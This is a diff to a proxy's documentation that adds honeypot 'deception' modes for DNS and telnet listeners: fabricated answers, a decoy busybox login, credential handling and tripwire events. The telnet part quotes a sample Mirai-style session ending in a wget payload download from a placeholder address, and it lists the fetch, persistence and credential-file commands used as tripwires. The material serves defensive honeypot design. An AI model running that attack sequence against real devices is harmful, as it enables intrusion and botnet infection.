@@ -688,6 +688,7 @@ browsers should use it) side by side.
 | `ecs` | `strip`, `forward` | `strip` | What happens to a client's EDNS Client Subnet option on the way upstream |
 | `cookies` | `off`, `respond`, `require` | `respond` | DNS cookies (RFC 7873): see below |
 | `cookie_lifetime` | duration | `1h` | How long a server cookie stays valid; at most 24h |
+| `deception` | object | none | Answer as a resolver that is not there: where a refusal would be written, or as a whole listener with nothing behind it; see below |
 
 #### server.listeners[].dns.cache: serve-stale and prefetch
 
@@ -1020,6 +1021,94 @@ dns:
     action: log
     allow_domains: ["*.avts.mcafee.com", "*.spamhaus.org", "*.sophosxl.net"]
 ```
+
+#### server.listeners[].dns.deception
+
+A resolver that is not there.
+
+On this protocol the refusal is *itself* information, and the query that drew it
+is the only thing the other end ever sends. A name on a threat feed answered
+NXDOMAIN tells an implant that something here is deciding. A domain a client was
+caught tunnelling under, refused for the cooldown, tells the tunnel to move to
+another channel — and the next channel is the one nobody is watching.
+
+A fabricated answer does not. The name resolves, the client keeps going, and
+every query after the first is collected: the next domain in the rotation, the
+next chunk of the payload, the next name the implant was told to try.
+
+```yaml
+dns:
+  # A honeypot resolver: no upstreams, because there is nothing behind it.
+  cookies: require          # so the record of who visited means something
+  deception:
+    mode: decoy
+    profile: documentation
+    ttl: 300s
+    tripwire: [payroll.internal]
+```
+
+| Key | Type | Default | Description |
+|-----|------|---------|-------------|
+| `enabled` | bool | `true` | Turns the section off without removing it |
+| `mode` | `answer`, `decoy` | `answer` | `answer`: a query this listener was going to refuse is answered by the fabrication instead. `decoy`: the whole listener is a fabricated resolver, with no `upstreams` |
+| `clients` | list of CIDR | | The networks that get the fabrication. **Required in mode `answer`.** In mode `decoy` an empty list means every client |
+| `profile` | `documentation`, `loopback`, `unroutable` | `documentation` | Where a fabricated answer points, which on this protocol is the whole of the shape: RFC 5737 and RFC 3849 (nothing routes there), the client's own machine, or `0.0.0.0` and `::` |
+| `addresses` | list of CIDR | the profile's | Replaces the pools: one IPv4 prefix, one IPv6 prefix, or both. **A pool inside the estate is a pool a visitor is then sent to** — point it at a honeypot on purpose, never at a host that does something else |
+| `ttl` | duration | `5m` | The TTL a fabricated answer carries; 1s to 1h, and never zero |
+| `tripwire` | list | | Names — a domain and its subdomains — that raise a `dns_tripwire` event. **In addition to** the built-in set below |
+| `seed` | int | from the listener name | Makes the fabricated addresses reproducible across restarts |
+| `period` | duration | `30s` | How long one sample of a fabricated value lasts, which here is the nonce a TXT answer is built from |
+| `max_clients` | int | `1024` | Bounds the record of who has been answered |
+
+**In mode `answer` it replaces the four refusals that say the name does not
+exist**: the `block` list, an imported name list (`threat_intel`), a response
+policy zone whose action is `nxdomain`, and the cooldown on a domain a client was
+caught tunnelling under. It never replaces an answer a rule named — RPZ
+`local`, `nodata` and `tcp_only` are answers an operator or a feed wrote — and it
+never touches a query on its way upstream.
+
+**A different address per name, which is what a sinkhole is not.** `sinkhole_ipv4`
+answers one address for every blocked name, so a visitor who looks up two of them
+and gets one address has found the sinkhole in one extra query. A fabricated
+answer is drawn from the pool by the name, stable for the life of the
+configuration, so the map a visitor draws looks like hosting rather than like a
+list.
+
+**A resolver is an amplifier, and this fabrication is not one.** A UDP datagram
+proves nothing about where it came from, so an answer to a client whose address
+nothing has verified is bounded against the query that asked for it — twice its
+size, which no honest answer here reaches — and truncated past that bound. A real
+client comes back over TCP; a spoofed source cannot. A datagram whose source a
+DNS cookie proved, and any query over TCP, DoT, DoH or DoQ, gets the full answer.
+
+**On a `decoy` listener, set `cookies: require`.** Nothing amplifies either way,
+but without cookies the address in the record is the one the datagram *claimed*,
+and a honeypot's record of who visited is the whole product. Validation says so
+at load.
+
+**What it answers**: A, AAAA, TXT and PTR. Everything else is NODATA — an empty
+NOERROR, which is the commonest truthful answer on this protocol. Inventing an MX
+would mean inventing a mail host to go with it, and an NS or SOA would be a claim
+of authority a forwarding resolver is not making. The TXT answer is the one a
+tunnel is waiting for: it carries no command, because this fabrication does not
+know the other end's protocol and will not guess, but it is the shape a tunnel
+accepts — and a tunnel that accepts an answer sends the next chunk.
+
+**The tripwires need no configuring**, and on this protocol they are mostly
+*types* rather than names: a zone transfer (AXFR, IXFR), a signature set (DNSKEY),
+ANY, the NULL record that exists to carry arbitrary octets, a query in a class
+that is not IN, a name over 100 octets (a hostname somebody typed is not, and a
+tunnel's is every time), and the fingerprint names — `version.bind`,
+`hostname.bind`, `id.server`, `authors.bind`, `version.server`,
+`trustanchor.unbound`. Those last are never answered either: a resolver that
+names itself has handed over the list of what it is vulnerable to, and one that
+names something else is caught by whoever knows what that version really says.
+
+Counters: `dns_deceived` and `dns_tripwire`. Security events: `dns_deceived` and
+`dns_tripwire`, with the name, the type, the transport and the refusal the
+fabrication replaced — each carrying whether the client's address was verified,
+for the reason every other event on this listener does. `xproxyctl decoys` lists
+what each fabrication has seen.
 
 #### server.listeners[].dns.doq
 
@@ -4288,6 +4377,119 @@ access line with the client, the name the factor was checked against,
 the target, how it ended and how many options were refused. Refusals
 are `telnet_denied` deny events, so bans apply.
 
+#### server.listeners[].telnet.deception
+
+A login that is not there.
+
+A telnet port on a public address is found within the hour, and what finds it is a
+*dictionary*: the Mirai family and everything written after it walk a list of the
+credentials that shipped on recorders, cameras and routers — a few thousand pairs,
+tried a handful at a time from a great many addresses.
+
+Refusing collects the address, which the firewall log already has. Answering
+collects the **list** — which pairs are in circulation this month, and whether any
+of them is one of yours — and then, because the login is accepted, what the thing
+came to do:
+
+```
+enable / system / shell / sh          is this a shell
+/bin/busybox MIRAI                    is it busybox, and which one
+echo -e '\x6b\x61\x6d\x69'            is anything actually reading this
+cat /proc/cpuinfo                     which payload do I need
+wget http://198.51.100.9/bins/x.arm7  and here is where it lives
+```
+
+That last line is the artefact. It names the payload, the address serving it and
+the architecture it was built for, and nothing else in this proxy produces it.
+
+```yaml
+telnet:
+  # A honeypot: no upstream, because there is no equipment behind it.
+  deception:
+    mode: decoy
+    profile: busybox
+    hostname: cam-07        # something this estate really has
+    attempts: 2
+    tripwire: [payroll]
+```
+
+| Key | Type | Default | Description |
+|-----|------|---------|-------------|
+| `enabled` | bool | `true` | Turns the section off without removing it |
+| `mode` | `answer`, `decoy` | `answer` | `answer`: a session this listener was going to refuse gets the fabrication instead. `decoy`: the whole listener is a fabricated device, with no `upstream` |
+| `clients` | list of CIDR | | The networks that get the fabrication. **Required in mode `answer`.** In mode `decoy` an empty list means every client |
+| `profile` | `busybox`, `linux` | `busybox` | The machine being impersonated: a recorder or camera (what is actually on port 23), or a small server |
+| `hostname` | string | the profile's | What a visitor reads in the login prompt, the shell prompt, `uname -a` and `/etc/hostname`. **Name it after something this estate really has** |
+| `attempts` | int | `1` | How many credentials are taken before the login is accepted (0 to 16). Two or three is what a real device's login looks like, and collects more of the dictionary |
+| `tripwire` | list | | Command names that raise a `telnet_tripwire` event. **In addition to** the built-in set below |
+| `seed` | int | from the listener name | Makes the fabricated numbers reproducible across restarts |
+| `period` | duration | `30s` | How long one sample of a fabricated number lasts — here the load average and the number of users logged in |
+| `max_clients` | int | `1024` | Bounds the record of who has been answered |
+
+**No password is recorded, in any form a guess can be tested against.** What is
+kept for each attempt is the user name (an identity, like every other kind's), the
+credential's **length**, and a `credential_id` — a handle computed under a key the
+process made at startup from the system random source and never writes down. That
+answers the question an operator actually has (*how many distinct passwords did
+this client try, and have we seen this one before*) and answers nothing to anybody
+who later reads the log. After a restart the handles are new, which is correct: the
+question is about a session or a campaign, not about the password. A process with
+no random source produces no handle at all rather than one under a constant key.
+
+The recording, where one is configured, holds the shell transcript and not the
+login: the credential prompts are written straight to the client and never reach
+the file, even with `input: true`.
+
+**The login never turns on the credential.** Every credential is accepted once
+`attempts` have been taken, and which one it was makes no difference to what
+happens next. A trap that accepted the right password and refused the wrong one
+would be a credential oracle, which is the one thing a password list needs.
+
+**In mode `answer` it replaces the refusals that happen after the proxy has
+spoken**: a failed or locked second factor, the estate's `authorization` policy,
+and a missing access grant. It does **not** replace `allow_clients` or a ban — an
+address that may not connect gets nothing, which is what the list means — and it
+never replaces an *outage*: a target that cannot be reached is an outage, and an
+operator working an incident must not be handed a fabricated device instead of
+"the target is unavailable".
+
+**A `decoy` listener will not compile with `mfa` or `require_grant`.** Its own
+login prompt is the trap and accepts everybody by design, so a factor in front of
+it would refuse the visitors it exists to collect, and a grant would be checked
+against a name nobody real typed. Validation says so rather than ignoring the
+setting. It also does not warn about the missing `tls` section: an unencrypted
+telnet port is what the scanning is looking for.
+
+**Nothing is run and nothing is fetched.** `wget`, `curl`, `tftp` and `ftpget`
+answer the connection timeout a device behind a firewall answers — after the
+address has been recorded. A fabrication that fetched the payload would be doing
+the download on the attacker's behalf, from this estate's address and with this
+estate's reputation.
+
+**The tripwires need no configuring**: the escalation, in the order it happens —
+`wget`, `curl`, `tftp`, `nc` (fetch it), `chmod`, `chattr`, `dd` (make it run),
+`nohup`, `setsid`, `insmod` (keep it running), `crontab`, `iptables`, `systemctl`
+(clear what would have stopped it), `busybox`, and the file names a credential
+lives in (`shadow`, `authorized_keys`, `id_rsa`). A command named by its path
+counts — `/usr/bin/wget` is `wget` — and `passwd` is deliberately *not* in the set,
+because `/etc/passwd` is the commonest reconnaissance on any machine and a tripwire
+that matched it would make every session look like an escalation.
+
+**What it will not invent**: `/etc/shadow` lists the accounts with `*` where a hash
+would be, because a fabricated hash is a machine's worth of somebody's time and a
+thing an operator could later mistake for real; `/tmp` is empty; and the shell
+history is empty, because a fabricated one would be inventing a person who used
+this machine.
+
+A session is bounded in commands as well as by `idle_timeout` and
+`session_timeout`, so a script in a loop cannot hold a worker on a listener whose
+whole purpose is to be found.
+
+Counters: `telnet_deceived` and `telnet_tripwire`. Security events:
+`telnet_credential` (the user name, the length, the handle and whether that
+attempt was accepted), `telnet_deceived` and `telnet_tripwire` (the command, one
+line, clipped). `xproxyctl decoys` lists what each fabrication has seen.
+
 ### server.listeners[].ftp (kind: ftp)
 
 A `kind: ftp` listener is a protocol-aware FTP proxy: the proxy is an
@@ -6807,7 +7009,7 @@ comes from a trusted proxy chain or `action` is `reject`.
 | Key | Type | Default | Description |
 |-----|------|---------|-------------|
 | `name` | name | required, unique | Appears in the ban entry as `trigger:<name>` |
-| `reasons` | list | `[]` (all) | Deny categories that count: `acl`, `rate_limit`, `waf`, `body_size`, `uri_length`, `bad_host`, `no_route`, `websocket`, `concurrency`, `challenge`, `jwt`, `icap`, `geo`, `tcp_no_route`, `forward_denied`, `forward_auth`, `honeypot`, `dns_blocked`, `dns_bogus`, `dns_rpz`, `honeytoken`, `account_abuse`, `api_abuse`, `threat_intel`, `scim`, `smtp_denied`, `mqtt_denied`, `ssh_denied`, `ftp_denied`, `syslog_denied`, `telnet_denied`, `vnc_denied`, `rdp_denied`, `forward_sni_mismatch`, `dns_tunnel`, `dns_answer_denied`, `sftp_icap`, `tcp_denied`, `udp_denied`, `modbus_denied`, `iec104_denied`, `snmp_denied`, `ldap_denied`, `tftp_denied`, `dhcp_denied`, `postgres_denied`, `mysql_denied`, `tds_denied`, `redis_denied`, `bacnet_denied`, `amqp_denied`, `s7_denied`, `ntp_denied`, `ntske_denied`, `dns_denied`, `dns_threat_intel`, `yara` |
+| `reasons` | list | `[]` (all) | Deny categories that count: `acl`, `rate_limit`, `waf`, `body_size`, `uri_length`, `bad_host`, `no_route`, `websocket`, `concurrency`, `challenge`, `jwt`, `icap`, `geo`, `tcp_no_route`, `forward_denied`, `forward_auth`, `honeypot`, `dns_blocked`, `dns_bogus`, `dns_rpz`, `honeytoken`, `account_abuse`, `api_abuse`, `threat_intel`, `scim`, `smtp_denied`, `mqtt_denied`, `ssh_denied`, `ftp_denied`, `syslog_denied`, `telnet_denied`, `vnc_denied`, `rdp_denied`, `forward_sni_mismatch`, `dns_tunnel`, `dns_answer_denied`, `sftp_icap`, `tcp_denied`, `udp_denied`, `modbus_denied`, `iec104_denied`, `snmp_denied`, `ldap_denied`, `tftp_denied`, `dhcp_denied`, `postgres_denied`, `mysql_denied`, `tds_denied`, `redis_denied`, `bacnet_denied`, `amqp_denied`, `s7_denied`, `ntp_denied`, `ntske_denied`, `dns_denied`, `dns_threat_intel`, `dns_deceived`, `dns_tripwire`, `telnet_tripwire`, `yara` |
 | `threshold` | int | required | Denies within `window` that trigger the ban |
 | `window` | duration | required | At most 24h |
 | `duration` | duration | required | First ban length |
